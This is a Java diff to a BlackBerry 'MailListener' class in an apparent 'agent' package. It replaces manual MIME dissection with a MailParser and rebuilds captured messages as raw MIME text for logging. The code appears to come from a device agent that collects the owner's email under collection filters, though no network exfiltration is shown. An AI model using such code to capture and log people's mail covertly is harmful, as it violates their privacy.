@@ -20,8 +20,11 @@ import net.rim.blackberry.api.mail.SendListener;
 import net.rim.blackberry.api.mail.ServiceConfiguration;
 import net.rim.blackberry.api.mail.Session;
 import net.rim.blackberry.api.mail.Store;
+import net.rim.blackberry.api.mail.SupportedAttachmentPart;
 import net.rim.blackberry.api.mail.TextBodyPart;
 import net.rim.blackberry.api.mail.Transport;
+import net.rim.blackberry.api.mail.UnsupportedAttachmentPart;
+import net.rim.blackberry.api.mail.BodyPart.ContentType;
 import net.rim.blackberry.api.mail.event.FolderEvent;
 import net.rim.blackberry.api.mail.event.FolderListener;
 import net.rim.blackberry.api.mail.event.StoreEvent;
@@ -30,10 +33,13 @@ import net.rim.device.api.servicebook.ServiceBook;
 import net.rim.device.api.servicebook.ServiceRecord;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.IntHashtable;
+import blackberry.agent.mail.Mail;
+import blackberry.agent.mail.MailParser;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
+import blackberry.utils.StringPair;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -63,140 +69,6 @@ public final class MailListener implements FolderListener, StoreListener,
     private static ServiceRecord[] mailServiceRecords;
     Filter realtimeFilter;
     Filter collectFilter;
-
-    /**
-     * controlla se il messaggio e' mime e ne stampa il contenuto.
-     * 
-     * @param multipart
-     *            the multipart
-     * @param maxMessageSize
-     *            the max message len
-     */
-    protected void dissectMultipart(final Multipart multipart,
-            StringBuffer mail, final long maxMessageSize) {
-        // This vector stores fields which are to be displayed only after all
-        // of the body fields are displayed. (Attachments and Contacts).
-        final Vector delayedFields = new Vector();
-
-        // Process each part of the multi-part, taking the appropriate action
-        // depending on the part's type. This loop should: display text and
-        // html body parts, recursively display multi-parts and store
-        // attachments and contacts to display later.
-        for (int index = 0; index < multipart.getCount(); index++) {
-            final BodyPart bodyPart = multipart.getBodyPart(index);
-
-            // If this body part is text then display all of it
-            if (bodyPart instanceof TextBodyPart) {
-
-                //#debug debug
-                debug.trace("dissectMultipart: TextBodyPart");
-
-                final TextBodyPart textBodyPart = (TextBodyPart) bodyPart;
-
-                // If there are missing parts of the text, try to retrieve the
-                // rest of it.
-                if (textBodyPart.hasMore()) {
-                    try {
-                        Transport.more(textBodyPart, true);
-                    } catch (final Exception e) {
-                        // #debug debug
-                        debug.trace("Transport.more(BodyPart, boolean) threw "
-                                + e.toString());
-                    }
-                }
-                String plainText = (String) textBodyPart.getContent();
-
-                mail.append("Content-type: " + textBodyPart.getContentType()
-                        + "; charset=UTF8\r\n\r\n");
-                //mail.append("Content-type: "+ textBodyPart.getContentType() +";\r\n\r\n");                          
-
-                mail.append(plainText);
-
-                //#debug debug
-                //debug.trace("TextBodyPart: " + mail.toString().substring(0,200));
-
-                // Display the plain text, using an EditField if the message is
-                // editable or a RichTextField if it is not editable. Note: this
-                // does not add any empty fields.
-                if (plainText.length() != 0) {
-                    if (maxMessageSize > 0
-                            && plainText.length() > maxMessageSize) {
-                        // se e' attivo il filtro sulla dimensione dell'email,
-                        // sovrascrive al body dell'email la stringa troncata
-                        plainText = plainText.substring(0,
-                                (int) (maxMessageSize));
-                    }
-                }
-            }
-            // #ifdef HAVE_MIME
-            else if (bodyPart instanceof MimeBodyPart) {
-                //#debug debug
-                debug.trace("dissectMultipart: MimeBodyPart");
-
-                final MimeBodyPart mimeBodyPart = (MimeBodyPart) bodyPart;
-
-                // If the content is text then display it
-                final String contentType = mimeBodyPart.getContentType();
-                if (contentType
-                        .startsWith(BodyPart.ContentType.TYPE_TEXT_HTML_STRING)) {
-                    final Object obj = mimeBodyPart.getContent();
-                    if (obj != null) {
-                        String htmlText = new String((byte[]) obj);
-                        // se e' attivo il filtro sulla dimensione dell'email,
-                        // sovrascrive al body dell'email la stringa troncata
-
-                        if (maxMessageSize > 0
-                                && htmlText.length() > maxMessageSize) {
-                            // se e' attivo il filtro sulla dimensione
-                            // dell'email,
-                            // sovrascrive al body dell'email la stringa
-                            // troncata
-                            htmlText = htmlText.substring(0,
-                                    (int) (maxMessageSize));
-                        }
-
-                        // #debug debug
-                        //debug.trace("Testo dell'email MIME: " + htmlText);
-
-                        addAllHeaders(mimeBodyPart.getAllHeaders(), mail);
-                        mail.append(htmlText);
-                        //#debug debug
-                        //debug.trace("HTML: " + mail.toString());
-                    }
-                } else if (contentType
-                        .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
-
-                    //#debug debug
-                    debug.trace("dissectMultipart: alternative");
-
-                    // If the body part is a multi-part and it has the the
-                    // content type of TYPE_MULTIPART_ALTERNATIVE_STRING, then
-                    // recursively display the multi-part.
-                    final Object obj = mimeBodyPart.getContent();
-                    if (obj instanceof Multipart) {
-                        final Multipart childMultipart = (Multipart) obj;
-                        final String childMultipartType = childMultipart
-                                .getContentType();
-                        if (childMultipartType
-                                .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
-                            dissectMultipart(childMultipart, mail,
-                                    maxMessageSize);
-                        }
-                    }
-                }
-            }
-            // #endif
-
-        }
-
-        // Now that the body parts have been displayed, display the queued
-        // fields while separating them by inserting a separator field.
-        for (int index = 0; index < delayedFields.size(); index++) {
-            // System.out.println(delayedFields.elementAt(index));
-            // #debug debug
-            debug.trace(delayedFields.elementAt(index).toString());
-        }
-    }
 
     /**
      * Instantiates a new mail listener.
@@ -335,46 +207,12 @@ public final class MailListener implements FolderListener, StoreListener,
 
         ByteArrayOutputStream os = null;
         try {
-            os = new ByteArrayOutputStream();
-            message.writeTo(os);
-            final byte[] rfc822 = os.toByteArray();
-
-            //final String content_type = "Content-Type: text/plain;\r\n";
-            //final String content_transfer = "Content-Transfer-Encoding: binary\r\n";
-
-            String messageContent = new String(rfc822);
-            //Object co = message.getContent();
-            //byte[] content = (byte[]) co;
-            //String messageContent =   new String(content);
-
-            int poscont = messageContent.indexOf("Content-Type");
-            if (poscont == -1) {
-                /*
-                 * int pos = messageContent.indexOf("\r\n\r\n");
-                 * if (pos > 0) {
-                 * String headers = messageContent.substring(0, pos);
-                 * String body = messageContent.substring(pos);
-                 * messageContent = headers + "\r\n" + plain + body;
-                 * }
-                 */
-
-                //messageContent = content_type + content_transfer + messageContent;
-            }
-
-            //#debug debug
-            debug.trace(messageContent);
-
-            //debug.trace("BodyText: " + message.getBodyText());
 
             final int flags = 1;
             final int size = message.getSize();
             final DateTime filetime = new DateTime(message.getReceivedDate());
 
             final byte[] additionalData = new byte[20];
-            /*
-             * UINT uVersion; 200 #define LOG_MAIL_VERSION 2009070301 201 UINT
-             * uFlags; 202 UINT uSize; 203 FILETIME ftTime;
-             */
 
             final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
                     false);
@@ -519,17 +357,12 @@ public final class MailListener implements FolderListener, StoreListener,
     private String parseMessage(final Message message, final long maxMessageSize) {
         Address[] addresses;
 
-        StringBuffer mail = new StringBuffer();
+        StringBuffer mailRaw = new StringBuffer();
 
-        /*
-         * Address[] from = message.getRecipients(Message.RecipientType.FROM);
-         * if (from.length == 0) {
-         * message.addHeader("From:", "localuser");
-         * }
-         */
-        message.addHeader("MIME-Version:", "1.0");
+        addAllHeaders(message.getAllHeaders(), mailRaw);
 
-        addAllHeaders(message.getAllHeaders(), mail);
+        MailParser parser = new MailParser(message);
+        Mail mail = parser.parse();
 
         //#mdebug
         debug.trace("Dimensione dell'email: " + message.getSize() + "bytes");
@@ -537,29 +370,40 @@ public final class MailListener implements FolderListener, StoreListener,
         debug.trace("Oggetto dell'email: " + message.getSubject());
         //mundebug
 
-        final Object obj = message.getContent();
+        mailRaw.append("MIME-Version: 1.0\r\n");
+        //1234567890123456789012345678
+        String boundary = "e0cb4e384e84aed0940485c69016";
 
-        Multipart parent = null;
-        // #ifdef HAVE_MIME
-        if (obj instanceof MimeBodyPart || obj instanceof TextBodyPart) {
-            final BodyPart bp = (BodyPart) obj;
-            parent = bp.getParent();
-        } else {
-            parent = (Multipart) obj;
+        if (mail.isMultipart()) {
+            mailRaw.append("Content-Type: multipart/alternative; boundary="
+                    + boundary + "\r\n\r\n");
+            mailRaw.append("\r\n--" + boundary + "\r\n");
+        }
+        
+        if (mail.hasText()) {
+            mailRaw.append("Content-type: text/plain; charset=UTF8\r\n\r\n");
+            mailRaw.append(mail.plainTextMessage);
         }
 
-        // Display the message body
-        final String mpType = parent.getContentType();
-
-        if (mpType
-                .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)
-                || mpType
-                        .equals(BodyPart.ContentType.TYPE_MULTIPART_MIXED_STRING)) {
-            dissectMultipart(parent, mail, maxMessageSize);
+        if (mail.isMultipart()) {
+            mailRaw.append("\r\n--" + boundary + "\r\n");
         }
-        // #endif
 
-        return mail.toString();
+        if (mail.hasHtml()) {
+            mailRaw.append("Content-type: text/html; charset=UTF8\r\n\r\n");
+            //mail.append("Content-Transfer-Encoding: quoted-printable");
+            mailRaw.append(mail.htmlMessage);
+        }
+
+        if (mail.isMultipart()) {
+            mailRaw.append("\r\n--" + boundary + "--\r\n");
+        }
+
+        mailRaw.append("\r\n");
+        
+        String craftedMail = mailRaw.toString();
+
+        return craftedMail;
     }
 
     private void addAllHeaders(final Enumeration headers, StringBuffer mail) {
